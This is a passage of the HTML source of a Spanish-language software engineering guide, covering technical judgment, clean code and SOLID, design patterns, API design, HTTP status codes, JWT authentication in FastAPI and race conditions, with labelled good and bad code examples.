+  El Ciclo de Desarrollo del Criterio Técnico
+
+  1. DECISIÓN   →   Tomar una decisión técnica con la información disponible
+       │            Documentar el razonamiento (aunque sea mentalmente)
+       │
+  2. OBSERVAR   →   Observar las consecuencias en producción real
+       │            ¿Se cumplieron las predicciones? ¿Qué fue diferente?
+       │
+  3. ANALIZAR   →   Postmortem personal: ¿por qué fue diferente?
+       │            ¿Qué información faltaba? ¿Qué asumí incorrectamente?
+       │
+  4. ACTUALIZAR →   Actualizar el modelo mental con el aprendizaje
+       │            La próxima decisión similar incorpora este conocimiento
+       │
+       └─────────── Repetir ──────────────────────────────────────────┐
+
+  El error más común: saltar de 1 a 1 sin pasar por 2, 3, y 4.
+  Acumular años de experiencia sin extraer el aprendizaje de cada experiencia
+  produce antigüedad, no criterio.
+</code></pre>
+                    </div>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El modelo mental del ingeniero senior se aplica directamente a las decisiones
+                            arquitectónicas: elegir
+                            entre <strong>Clean Architecture y un monolito simple</strong>, entre <strong>consistencia
+                                fuerte y
+                                eventual consistency</strong>, entre <strong>construir y comprar</strong>. El criterio
+                            técnico es lo que
+                            convierte el conocimiento de patrones en decisiones correctas para el contexto específico.
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 02: EL OFICIO DEL CÓDIGO
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap02">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 02</span>
+                        <h2>El Oficio del Código</h2>
+                    </div>
+
+                    <p>El código se escribe una vez y se lee decenas de veces. Un estudio de Microsoft Research encontró
+                        que los
+                        ingenieros pasan el <strong>70% del tiempo leyendo código</strong> — el propio y el ajeno.
+                        Escribir código
+                        que otros puedan leer, entender, y modificar sin miedo no es un lujo estético — es una habilidad
+                        de
+                        ingeniería con impacto directo en la velocidad del equipo.</p>
+
+                    <h3 id="naming">Naming: La Habilidad más Subestimada</h3>
+                    <p>Phil Karlton dijo que hay dos problemas difíciles en ciencias de la computación: invalidación de
+                        caché y
+                        nombrar cosas. El naming incorrecto es una mentira que el código cuenta sobre sí mismo. Cada
+                        nombre
+                        incorrecto es deuda cognitiva que se paga cada vez que alguien lee ese código.</p>
+
+                    <pre data-lang="typescript"><code><span class="cm">// ❌ Naming que miente o que no dice nada</span>
+<span class="kw">function</span> <span class="fn">process</span>(d: any): any {
+  <span class="kw">const</span> r = d.filter((x: any) => x.s === <span class="nm">1</span>)
+  <span class="kw">return</span> r.map((x: any) => ({ ...x, t: Date.now() }))
+}
+
+<span class="cm">// ¿Qué procesa? ¿Qué significa s === 1? ¿Qué es t?
+// Para entender esto hay que: leer el contexto, buscar dónde se llama,
+// buscar qué significa s y t en la entidad. Costo cognitivo alto.</span>
+
+<span class="cm">// ✓ Naming que documenta la intención</span>
+<span class="kw">function</span> <span class="fn">markActiveUsersAsProcessed</span>(users: User[]): User[] {
+  <span class="kw">const</span> activeUsers = users.filter(user => user.status === UserStatus.Active)
+  <span class="kw">return</span> activeUsers.map(user => ({
+    ...user,
+    processedAt: Date.now()
+  }))
+}
+
+<span class="cm">// El nombre de la función ES la documentación.
+// No necesitas comentarios si el código se lee como prosa.</span>
+
+<span class="cm">// ─────────────────────────────────────────────────────────────
+// REGLAS DE NAMING QUE REALMENTE IMPORTAN:
+// ─────────────────────────────────────────────────────────────
+
+// 1. Variables: sustantivos que describen el contenido
+//    ❌ data, info, result, temp, x, val
+//    ✓  userProfile, activeOrders, totalRevenueUSD
+
+// 2. Funciones: verbos que describen la acción
+//    ❌ user(), orders(), handle()
+//    ✓  fetchUserById(), calculateOrderTotal(), validateEmailFormat()
+
+// 3. Booleans: preguntas que se responden con sí/no
+//    ❌ active, valid, user
+//    ✓  isActive, hasValidEmail, canEditProfile
+
+// 4. Longitud proporcional al scope
+//    Loop variable: i está bien
+//    Función pública en API: nombre descriptivo completo
+
+// 5. Evitar abreviaturas excepto las universales (id, url, dto)
+//    ❌ usr, ord, pmt, qty
+//    ✓  user, order, payment, quantity</span></code></pre>
+
+                    <h4>FUNCIONES: UNA SOLA RESPONSABILIDAD, UN SOLO NIVEL DE ABSTRACCIÓN</h4>
+                    <pre data-lang="python"><code><span class="cm"># ❌ Función que hace demasiado y mezcla niveles de abstracción</span>
+<span class="kw">def</span> <span class="fn">process_order</span>(order_data: dict) -> dict:
+    <span class="cm"># Validación de campos</span>
+    <span class="kw">if</span> <span class="kw">not</span> order_data.get(<span class="str">'user_id'</span>):
+        <span class="kw">raise</span> ValueError(<span class="str">'user_id required'</span>)
+    <span class="kw">if</span> <span class="kw">not</span> order_data.get(<span class="str">'items'</span>) <span class="kw">or</span> len(order_data[<span class="str">'items'</span>]) == <span class="nm">0</span>:
+        <span class="kw">raise</span> ValueError(<span class="str">'items required'</span>)
+
+    <span class="cm"># Cálculo de totales</span>
+    subtotal = sum(item[<span class="str">'price'</span>] * item[<span class="str">'quantity'</span>] <span class="kw">for</span> item <span class="kw">in</span> order_data[<span class="str">'items'</span>])
+    tax = subtotal * <span class="nm">0.21</span>
+    total = subtotal + tax
+
+    <span class="cm"># Guardar en base de datos</span>
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute(<span class="str">"INSERT INTO orders (user_id, total) VALUES (?, ?)"</span>,
+                   (order_data[<span class="str">'user_id'</span>], total))
+    order_id = cursor.lastrowid
+    conn.commit()
+
+    <span class="cm"># Enviar email</span>
+    send_email(order_data[<span class="str">'user_email'</span>], f<span class="str">"Order {order_id} confirmed"</span>)
+
+    <span class="kw">return</span> {<span class="str">'order_id'</span>: order_id, <span class="str">'total'</span>: total}
+
+<span class="cm"># Problemas: imposible testear sin BD y email reales, 
+# mezcla SQL con lógica de negocio, viola SRP masivamente</span>
+
+<span class="cm"># ✓ Separación de responsabilidades en capas claras</span>
+<span class="kw">def</span> <span class="fn">create_order</span>(command: CreateOrderCommand, 
+                  repo: OrderRepository,
+                  notifier: OrderNotifier) -> Order:
+    <span class="fn">_validate_order_command</span>(command)           <span class="cm"># valida</span>
+    order = <span class="fn">_build_order_from_command</span>(command) <span class="cm"># construye</span>
+    saved = repo.<span class="fn">save</span>(order)                    <span class="cm"># persiste</span>
+    notifier.<span class="fn">order_created</span>(saved)               <span class="cm"># notifica</span>
+    <span class="kw">return</span> saved
+
+<span class="cm"># Cada función hace UNA cosa. Cada dependencia es inyectada.
+# Testeable de forma aislada. Legible como prosa.</span></code></pre>
+
+                    <h3 id="solid-real">SOLID: Aplicado con Profundidad Real</h3>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Principio</th>
+                                    <th>La regla simple</th>
+                                    <th>Lo que realmente significa</th>
+                                    <th>Señal de violación</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="b"><strong>S — SRP</strong></td>
+                                    <td>Una clase, una razón para cambiar</td>
+                                    <td>Una clase debe ser responsable ante un único actor del sistema. No "hace una
+                                        cosa" — responde a un
+                                        único stakeholder</td>
+                                    <td>La clase cambia cuando el equipo de finanzas cambia algo Y cuando el equipo de
+                                        UI cambia algo</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>O — OCP</strong></td>
+                                    <td>Abierto a extensión, cerrado a modificación</td>
+                                    <td>Añadir comportamiento nuevo sin tocar código existente. Logrado con
+                                        polimorfismo, no con if/else
+                                    </td>
+                                    <td>Añadir un nuevo tipo de pago requiere modificar la clase PaymentProcessor
+                                        existente</td>
+                                </tr>
+                                <tr>
+                                    <td class="y"><strong>L — LSP</strong></td>
+                                    <td>Subtipos sustituibles por el supertipo</td>
+                                    <td>Si tienes código que funciona con Animal, debe funcionar con Perro sin cambios
+                                        ni sorpresas</td>
+                                    <td>Una subclase que lanza una excepción en un método que el padre implementa
+                                        silenciosamente</td>
+                                </tr>
+                                <tr>
+                                    <td class="v"><strong>I — ISP</strong></td>
+                                    <td>Interfaces pequeñas y focalizadas</td>
+                                    <td>Los clientes no deben depender de métodos que no usan. Múltiples interfaces
+                                        pequeñas > una grande
+                                    </td>
+                                    <td>Implementar una interfaz y dejar métodos con
+                                        <code>throw NotImplementedException</code>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="t"><strong>D — DIP</strong></td>
+                                    <td>Depender de abstracciones, no de implementaciones</td>
+                                    <td>El módulo de alto nivel define la interfaz que necesita. El módulo de bajo nivel
+                                        la implementa
+                                    </td>
+                                    <td>La lógica de negocio hace <code>new PostgresRepository()</code> directamente
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <pre data-lang="java"><code><span class="cm">// DIP — Dependency Inversion con ejemplos reales</span>
+
+<span class="cm">// ❌ Viola DIP: el Use Case depende de la implementación concreta</span>
+<span class="kw">class</span> <span class="fn">CreateUserUseCase</span> {
+    <span class="kw">private final</span> PostgresUserRepository repo = <span class="kw">new</span> <span class="fn">PostgresUserRepository</span>();
+    <span class="cm">// Imposible testear sin una BD PostgreSQL real</span>
+    <span class="cm">// Imposible cambiar a MongoDB sin modificar el use case</span>
+}
+
+<span class="cm">// ✓ Respeta DIP: el Use Case define qué necesita, no cómo se implementa</span>
+<span class="kw">interface</span> <span class="fn">UserRepository</span> {               <span class="cm">// Definida en la capa de dominio</span>
+    User save(User user);
+    Optional&lt;User&gt; findById(UserId id);
+}
+
+<span class="kw">class</span> <span class="fn">CreateUserUseCase</span> {
+    <span class="kw">private final</span> UserRepository repo;  <span class="cm">// Depende de la abstracción</span>
+
+    <span class="kw">public</span> <span class="fn">CreateUserUseCase</span>(UserRepository repo) {
+        <span class="kw">this</span>.repo = repo;               <span class="cm">// Inyectado desde fuera</span>
+    }
+
+    <span class="kw">public</span> User <span class="fn">execute</span>(CreateUserCommand cmd) {
+        <span class="kw">var</span> user = User.<span class="fn">create</span>(cmd.email(), cmd.name());
+        <span class="kw">return</span> repo.<span class="fn">save</span>(user);
+    }
+}
+
+<span class="cm">// En tests: InMemoryUserRepository (instantáneo, sin I/O)
+// En producción: PostgresUserRepository
+// El use case no sabe ni le importa la diferencia</span></code></pre>
+
+                    <h3 id="tech-debt">Deuda Técnica: Herramienta, No Excusa</h3>
+                    <p>La deuda técnica no es sinónimo de código malo. Es una metáfora financiera: a veces tiene sentido
+                        tomar una
+                        deuda deliberada (lanzar más rápido con una solución subóptima) si el retorno justifica el costo
+                        del interés
+                        (el trabajo adicional para mantenerla).</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Tipos de Deuda Técnica (Cuadrante de Fowler)
+
+                    DELIBERADA          INADVERTIDA
+                  ┌───────────────────┬──────────────────────┐
+   PRUDENTE       │ "No tenemos       │ "Ahora sabemos que   │
+                  │ tiempo de         │ deberíamos haber     │
+                  │ diseñar bien"     │ usado esta           │
+                  │                   │ arquitectura"        │
+                  │ → Documentar,     │                      │
+                  │   pagar pronto    │ → Aprender, mejorar  │
+                  ├───────────────────┼──────────────────────┤
+   IMPRUDENTE     │ "No hay tiempo    │ "¿Qué son las        │
+                  │ para tests"       │ capas?"              │
+                  │                   │                      │
+                  │ → Problema real   │ → Problema de        │
+                  │   a corto plazo   │   contratación /     │
+                  │                   │   formación          │
+                  └───────────────────┴──────────────────────┘
+
+  La deuda deliberada-prudente es una herramienta válida.
+  La deuda inadvertida o imprudente es un problema de proceso o equipo.
+
+  El costo real de la deuda técnica:
+  • Velocidad de desarrollo reducida (interés compuesto)
+  • Bugs más difíciles de aislar (código acoplado)
+  • Onboarding más lento (código incomprensible)
+  • Miedo a cambiar (código sin tests)
+  • Rotación de ingenieros (trabajo frustrante)
+</code></pre>
+                    </div>
+
+                    <div class="callout tip">
+                        <div class="callout-icon"></div>
+                        <p><strong>La regla del boy scout:</strong> Deja el código un poco mejor de como lo encontraste.
+                            No un gran
+                            refactor — renombrar una variable confusa, extraer una función, añadir un test que faltaba.
+                            Aplicado
+                            consistentemente por todo el equipo, revierte la entropía del código sin interrumpir el
+                            desarrollo de
+                            features.</p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 03: DISEÑO DE SOFTWARE
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap03">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 03</span>
+                        <h2>Diseño de Software</h2>
+                    </div>
+
+                    <p>El diseño de software ocurre constantemente, no solo al principio de un proyecto. Cada vez que
+                        nombras una
+                        función, defines una interfaz, o decides dónde vive un pedazo de lógica — estás diseñando. La
+                        diferencia
+                        entre un ingeniero que diseña bien y uno que no lo hace no está en el conocimiento de patrones,
+                        sino en la
+                        capacidad de reconocer qué problema tienen que resolver.</p>
+
+                    <h3 id="patterns">Patrones de Diseño como Soluciones a Problemas Reales</h3>
+                    <p>Los patrones de diseño son soluciones reutilizables a problemas recurrentes. El error es
+                        aprenderlos como
+                        un catálogo a memorizar. El valor está en reconocer el problema que cada patrón resuelve — y
+                        solo entonces
+                        aplicarlo.</p>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Patrón</th>
+                                    <th>Problema real que resuelve</th>
+                                    <th>Señal de que lo necesitas</th>
+                                    <th>Anti-pattern de aplicación</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>Strategy</strong></td>
+                                    <td>Comportamiento intercambiable en runtime sin if/else</td>
+                                    <td>Tienes un switch/if-else que crece cada vez que añades un tipo</td>
+                                    <td>Crear Strategy para comportamiento que nunca cambia</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Observer</strong></td>
+                                    <td>Notificar a múltiples componentes sin acoplamiento directo</td>
+                                    <td>Un cambio en objeto A requiere llamar a B, C, D directamente</td>
+                                    <td>Observadores con side effects no predecibles ni testeables</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Decorator</strong></td>
+                                    <td>Añadir responsabilidades a un objeto sin modificar su clase</td>
+                                    <td>Necesitas logging/caching/retry en múltiples implementaciones</td>
+                                    <td>Cadenas de decoradores tan profundas que el debugging es imposible</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Factory</strong></td>
+                                    <td>Centralizar la lógica de creación de objetos complejos</td>
+                                    <td>La lógica de crear un objeto está duplicada en múltiples lugares</td>
+                                    <td>Factory que hace demasiado — viola SRP también</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Repository</strong></td>
+                                    <td>Abstraer el acceso a datos del dominio de negocio</td>
+                                    <td>SQL/ORM queries dispersas en la lógica de negocio</td>
+                                    <td>Repository que filtra, ordena, pagina Y hace joins complejos — se convierte en
+                                        un ORM wrapper</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Builder</strong></td>
+                                    <td>Construir objetos complejos paso a paso</td>
+                                    <td>Constructor con 7+ parámetros donde el orden importa</td>
+                                    <td>Builder para objetos simples — añade complejidad sin valor</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <pre data-lang="typescript"><code><span class="cm">// Strategy Pattern — caso real: procesadores de pago</span>
+
+<span class="cm">// ❌ Sin Strategy: cada nuevo procesador requiere modificar esta clase</span>
+<span class="kw">class</span> <span class="fn">PaymentService</span> {
+  <span class="fn">charge</span>(amount: number, provider: string) {
+    <span class="kw">if</span> (provider === <span class="str">'stripe'</span>) {
+      <span class="cm">// lógica de Stripe...</span>
+    } <span class="kw">else if</span> (provider === <span class="str">'paypal'</span>) {
+      <span class="cm">// lógica de PayPal...</span>
+    } <span class="kw">else if</span> (provider === <span class="str">'mercadopago'</span>) {
+      <span class="cm">// lógica de MercadoPago...</span>
+    }
+    <span class="cm">// Cada nuevo procesador = modificar esta clase = riesgo de regresión</span>
+  }
+}
+
+<span class="cm">// ✓ Con Strategy: añadir procesador = añadir clase, sin tocar lo existente</span>
+<span class="kw">interface</span> <span class="fn">PaymentProvider</span> {
+  charge(amount: Money, metadata: PaymentMetadata): Promise&lt;PaymentResult&gt;
+  refund(transactionId: string): Promise&lt;RefundResult&gt;
+}
+
+<span class="kw">class</span> <span class="fn">StripeProvider</span> <span class="kw">implements</span> PaymentProvider { <span class="cm">/* ... */</span> }
+<span class="kw">class</span> <span class="fn">PayPalProvider</span> <span class="kw">implements</span> PaymentProvider { <span class="cm">/* ... */</span> }
+<span class="kw">class</span> <span class="fn">MercadoPagoProvider</span> <span class="kw">implements</span> PaymentProvider { <span class="cm">/* ... */</span> }
+
+<span class="kw">class</span> <span class="fn">PaymentService</span> {
+  <span class="kw">constructor</span>(<span class="kw">private</span> provider: PaymentProvider) {}
+
+  <span class="kw">async</span> <span class="fn">charge</span>(amount: Money, metadata: PaymentMetadata) {
+    <span class="kw">return</span> <span class="kw">this</span>.provider.<span class="fn">charge</span>(amount, metadata)
+    <span class="cm">// Funciona con CUALQUIER provider — presente y futuro</span>
+  }
+}</code></pre>
+
+                    <h3 id="api-design">API Design: El Contrato Permanente</h3>
+                    <p>Una API pública es una decisión arquitectónica irreversible. Una vez que clientes dependen de
+                        ella,
+                        cambiarla tiene un costo real. El diseño de una API es el trabajo que más durará en el tiempo —
+                        más que
+                        cualquier implementación subyacente.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Principios de API Design que Envejecen Bien
+
+  1. NOMBRES COMO RECURSOS, VERBOS COMO ACCIONES HTTP
+     ❌ GET /getUser?id=123
+     ❌ POST /createOrder
+     ✓  GET /users/123
+     ✓  POST /orders
+
+  2. VERSIONADO DESDE EL DÍA 1
+     ✓  /api/v1/users
+     Sin versión = imposible hacer breaking changes sin romper clientes
+
+  3. ERRORES INFORMATIVO Y CONSISTENTES (RFC 7807)
+     ❌ HTTP 400 { "error": "bad" }
+     ✓  HTTP 422 {
+           "type": "https://api.company.com/errors/validation",
+           "title": "Validation Failed",
+           "detail": "email must be a valid email address",
+           "invalid_params": [{"name": "email", "reason": "invalid format"}]
+        }
+
+  4. PAGINACIÓN CONSISTENTE
+     ✓  GET /users?page=2&per_page=50
+        Response: { "data": [...], "meta": { "total": 1234,
+                    "page": 2, "per_page": 50, "pages": 25 } }
+
+  5. IDEMPOTENCY KEYS EN OPERACIONES CRÍTICAS
+     POST /payments
+     Idempotency-Key: client-generated-uuid
+     → Si el request falla y se reintenta con la misma key,
+       el servidor retorna el resultado original sin re-procesar
+
+  6. BACKWARD COMPATIBILITY
+     ✓  Añadir campos opcionales: seguro
+     ✓  Deprecar campos (documentar, mantener 1 versión)
+     ❌ Renombrar campos existentes: breaking change
+     ❌ Cambiar tipo de un campo: breaking change
+     ❌ Hacer obligatorio algo que era opcional: breaking change
+</code></pre>
+                    </div>
+
+                    <h3 id="abstractions">Abstracciones: El Arte del Equilibrio</h3>
+                    <p>Una abstracción correcta oculta complejidad sin ocultar información importante. Una abstracción
+                        incorrecta
+                        — o prematura — es una de las fuentes más comunes de deuda técnica. Joel Spolsky formuló la
+                        <em>Ley de las
+                            Abstracciones con Fugas</em>: todas las abstracciones no triviales tienen fugas.
+                    </p>
+
+                    <pre data-lang="python"><code><span class="cm"># Abstracción prematura: el enemigo silencioso</span>
+
+<span class="cm"># Inicio del proyecto — dos casos de uso:</span>
+<span class="kw">def</span> <span class="fn">send_welcome_email</span>(user_email: str): ...
+<span class="kw">def</span> <span class="fn">send_password_reset</span>(user_email: str): ...
+
+<span class="cm"># ❌ Abstracción prematura — crear un EmailSender genérico
+#    con factory, template engine, y 400 líneas "para ser flexible"
+#    cuando todavía no sabemos qué variaciones reales necesitaremos</span>
+
+<span class="cm"># ✓ Esperar hasta el tercer caso de uso para abstraer
+#    La abstracción correcta solo se puede ver con suficientes ejemplos concretos
+#    "Make it work, make it right, make it fast" — en ese orden</span>
+
+<span class="cm"># Regla: duplicar está permitido UNA vez.
+#         Al tercer caso de duplicación, abstraer.
+#         Esta es la "Rule of Three" de abstracción.</span>
+
+<span class="cm"># ─────────────────────────────────────────────────────────────
+# Señales de que una abstracción está MAL:</span>
+
+<span class="cm"># 1. Necesita un nombre genérico porque no sabes qué hace
+#    Manager, Handler, Processor, Helper, Utils → red flags</span>
+
+<span class="cm"># 2. Tiene más de un nivel de indirección innecesario
+#    service.getRepository().findById() vs userRepo.findById()</span>
+
+<span class="cm"># 3. Los casos de uso concretos necesitan "escapar" de la abstracción
+#    if isinstance(repo, PostgresUserRepo):  → abstracción rota</span>
+
+<span class="cm"># 4. Es más difícil de entender que el código que reemplaza
+#    La abstracción debe REDUCIR la carga cognitiva, no aumentarla</span></code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El diseño de software es la capa donde los principios arquitectónicos se materializan en
+                            código.
+                            <strong>Hexagonal Architecture</strong> se implementa mediante interfaces (puertos) e
+                            implementaciones
+                            concretas (adapters). <strong>DDD</strong> se implementa mediante el modelado cuidadoso de
+                            entidades,
+                            value objects, y bounded contexts en el código. Los patrones de diseño son los bloques de
+                            construcción de
+                            cualquier arquitectura bien diseñada.
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 04: BACKEND ENGINEERING
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap04">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 04</span>
+                        <h2>Backend Engineering</h2>
+                    </div>
+
+                    <p>El backend es el sistema nervioso de cualquier aplicación. Diseñarlo bien significa entender el
+                        protocolo
+                        sobre el que opera, gestionar el estado de forma predecible, manejar la concurrencia sin race
+                        conditions, y
+                        fallar de maneras informativas y recuperables.</p>
+
+                    <h3 id="http-deep">HTTP: El Protocolo que Todo Backend Habla</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  HTTP Request-Response: Lo que realmente ocurre
+
+  Cliente                              Servidor
+    │                                     │
+    │──DNS lookup (¿dónde está host?)─────►│
+    │◄─IP address──────────────────────────│
+    │                                     │
+    │──TCP handshake (SYN/SYN-ACK/ACK)───►│
+    │                                     │
+    │──TLS handshake (HTTPS)──────────────►│
+    │  (certificados, cipher suite, keys) │
+    │                                     │
+    │──HTTP Request───────────────────────►│
+    │  GET /users/123 HTTP/1.1            │
+    │  Host: api.company.com              │
+    │  Authorization: Bearer eyJ...       │
+    │  Accept: application/json           │
+    │  Connection: keep-alive             │
+    │                                     │
+    │◄─HTTP Response───────────────────────│
+    │  HTTP/1.1 200 OK                    │
+    │  Content-Type: application/json     │
+    │  Cache-Control: max-age=300         │
+    │  ETag: "abc123"                     │
+    │  X-Request-Id: uuid-v4             │
+    │                                     │
+    │  { "id": "123", "name": "..." }     │
+
+  Lo que muchos backends ignoran:
+  • Connection: keep-alive — reutilizar conexiones TCP (HTTP/1.1 default)
+  • ETag — permitir conditional requests (304 Not Modified)
+  • X-Request-Id — tracing de requests entre servicios
+  • Cache-Control — qué puede cachear el cliente/CDN
+</code></pre>
+                    </div>
+
+                    <h4>STATUS CODES: USARLOS CORRECTAMENTE IMPORTA</h4>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Código</th>
+                                    <th>Cuándo usarlo</th>
+                                    <th>Error común</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="g"><strong>200 OK</strong></td>
+                                    <td>Request exitoso con respuesta</td>
+                                    <td>Usarlo para errores de negocio con body de error</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>201 Created</strong></td>
+                                    <td>Recurso creado exitosamente (POST)</td>
+                                    <td>Retornar 200 en vez de 201 para creaciones</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>204 No Content</strong></td>
+                                    <td>Éxito sin cuerpo de respuesta (DELETE)</td>
+                                    <td>Retornar 200 con body vacío</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>400 Bad Request</strong></td>
+                                    <td>Error de validación del cliente</td>
+                                    <td>Usarlo para errores de servidor</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>401 Unauthorized</strong></td>
+                                    <td>No autenticado (sin token o token inválido)</td>
+                                    <td>Confundirlo con 403</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>403 Forbidden</strong></td>
+                                    <td>Autenticado pero sin permiso</td>
+                                    <td>Retornar 404 para ocultar que el recurso existe</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>404 Not Found</strong></td>
+                                    <td>Recurso no encontrado</td>
+                                    <td>Retornar 400 cuando es realmente un 404</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>409 Conflict</strong></td>
+                                    <td>Estado del recurso en conflicto con el request</td>
+                                    <td>No usarlo para duplicados — es exactamente para eso</td>
+                                </tr>
+                                <tr>
+                                    <td class="b"><strong>422 Unprocessable</strong></td>
+                                    <td>Validación semántica fallida (campos válidos pero inconsistentes)</td>
+                                    <td>Confundirlo con 400</td>
+                                </tr>
+                                <tr>
+                                    <td class="y"><strong>429 Too Many Requests</strong></td>
+                                    <td>Rate limit excedido</td>
+                                    <td>Retornar 503 cuando es un rate limit del cliente</td>
+                                </tr>
+                                <tr>
+                                    <td class="r"><strong>500 Internal Error</strong></td>
+                                    <td>Error inesperado del servidor</td>
+                                    <td>Exponer detalles del error interno al cliente</td>
+                                </tr>
+                                <tr>
+                                    <td class="r"><strong>503 Unavailable</strong></td>
+                                    <td>Servicio temporalmente no disponible</td>
+                                    <td>Retornar 500 cuando el servicio está en mantenimiento planificado</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h3 id="auth">Autenticación y Autorización: Conceptos Diferentes</h3>
+                    <p><strong>Autenticación</strong> responde "¿quién eres?". <strong>Autorización</strong> responde
+                        "¿qué puedes
+                        hacer?". Confundirlos es uno de los errores de seguridad más comunes.</p>
+
+                    <pre data-lang="python"><code><span class="cm"># Implementación completa de JWT auth en FastAPI</span>
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime, timedelta, timezone
+<span class="kw">from</span> jose <span class="kw">import</span> jwt, JWTError
+<span class="kw">import</span> bcrypt
+
+SECRET_KEY = <span class="str">"env-variable-never-hardcoded"</span>
+ALGORITHM  = <span class="str">"HS256"</span>
+
+<span class="kw">def</span> <span class="fn">hash_password</span>(plain: str) -> str:
+    <span class="cm"># bcrypt: auto-salted, trabajo configurable, resistente a rainbow tables</span>
+    <span class="kw">return</span> bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=<span class="nm">12</span>)).decode()
+
+<span class="kw">def</span> <span class="fn">verify_password</span>(plain: str, hashed: str) -> bool:
+    <span class="kw">return</span> bcrypt.checkpw(plain.encode(), hashed.encode())
+    <span class="cm"># bcrypt es timing-safe por diseño — evita timing attacks</span>
+
+<span class="kw">def</span> <span class="fn">create_access_token</span>(user_id: str, roles: list[str]) -> str:
+    payload = {
+        <span class="str">"sub"</span>:   user_id,
+        <span class="str">"roles"</span>: roles,
+        <span class="str">"iat"</span>:   datetime.now(timezone.utc),
+        <span class="str">"exp"</span>:   datetime.now(timezone.utc) + timedelta(minutes=<span class="nm">15</span>),
+        <span class="cm"># Access token corto (15 min). Refresh token largo en httpOnly cookie.</span>
+    }
+    <span class="kw">return</span> jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
+
+<span class="kw">def</span> <span class="fn">require_permission</span>(permission: str):
+    <span class="str">"""Decorator de autorización basado en permisos"""</span>
+    <span class="kw">def</span> <span class="fn">decorator</span>(func):
+        <span class="k2">@wraps</span>(func)
+        <span class="kw">async def</span> <span class="fn">wrapper</span>(*args, current_user: User = Depends(get_current_user), **kwargs):
+            <span class="cm"># AUTENTICACIÓN: get_current_user valida el JWT</span>
+            <span class="cm"># AUTORIZACIÓN: verificar si tiene el permiso específico</span>
+            <span class="kw">if</span> permission <span class="kw">not in</span> current_user.permissions:
+                <span class="kw">raise</span> HTTPException(
+                    status_code=<span class="nm">403</span>,
+                    detail=<span class="str">f"Permission '{permission}' required"</span>
+                )
+            <span class="kw">return await</span> func(*args, current_user=current_user, **kwargs)
+        <span class="kw">return</span> wrapper
+    <span class="kw">return</span> decorator
+
+<span class="cm"># Uso: separación clara entre autenticación y autorización</span>
+<span class="k2">@router.delete</span>(<span class="str">"/users/{user_id}"</span>)
+<span class="k2">@require_permission</span>(<span class="str">"users:delete"</span>)
+<span class="kw">async def</span> <span class="fn">delete_user</span>(user_id: str, current_user: User = Depends()):
+    <span class="kw">await</span> user_service.<span class="fn">delete</span>(user_id)</code></pre>
+
+                    <h3 id="concurrency">Concurrencia: Los Problemas que Solo Aparecen en Producción</h3>
+
+                    <pre data-lang="python"><code><span class="cm"># Race condition clásica — el problema más silencioso del backend</span>
+
+<span class="cm"># ❌ Race condition en actualización de inventario</span>
+<span class="kw">async def</span> <span class="fn">reserve_item</span>(item_id: str, quantity: int):
+    item = <span class="kw">await</span> db.<span class="fn">get_item</span>(item_id)        <span class="cm"># Lee stock = 5</span>
+    <span class="cm"># ← Otro request también lee stock = 5 AQUÍ</span>
+    <span class="kw">if</span> item.stock &lt; quantity:
+        <span class="kw">raise</span> InsufficientStockError()
+    <span class="kw">await</span> db.<span class="fn">update_stock</span>(item_id, item.stock - quantity)
+    <span class="cm"># Ambos requests reservan 3 unidades, stock final = -1 🐛</span>
+
+<span class="cm"># ✓ Solución 1: Optimistic locking — detectar conflicto, reintentar</span>
+<span class="kw">async def</span> <span class="fn">reserve_item_optimistic</span>(item_id: str, quantity: int):
+    <span class="kw">for</span> attempt <span class="kw">in</span> range(<span class="nm">3</span>):  <span class="cm"># Max 3 reintentos</span>
+        item = <span class="kw">await</span> db.<span class="fn">get_item</span>(item_id)
+        <span class="kw">if</span> item.stock &lt; quantity:
+            <span class="kw">raise</span> InsufficientStockError()
+        updated = <span class="kw">await</span> db.<span class="fn">update_stock_if_version_matches</span>(
+            item_id,
+            new_stock=item.stock - quantity,
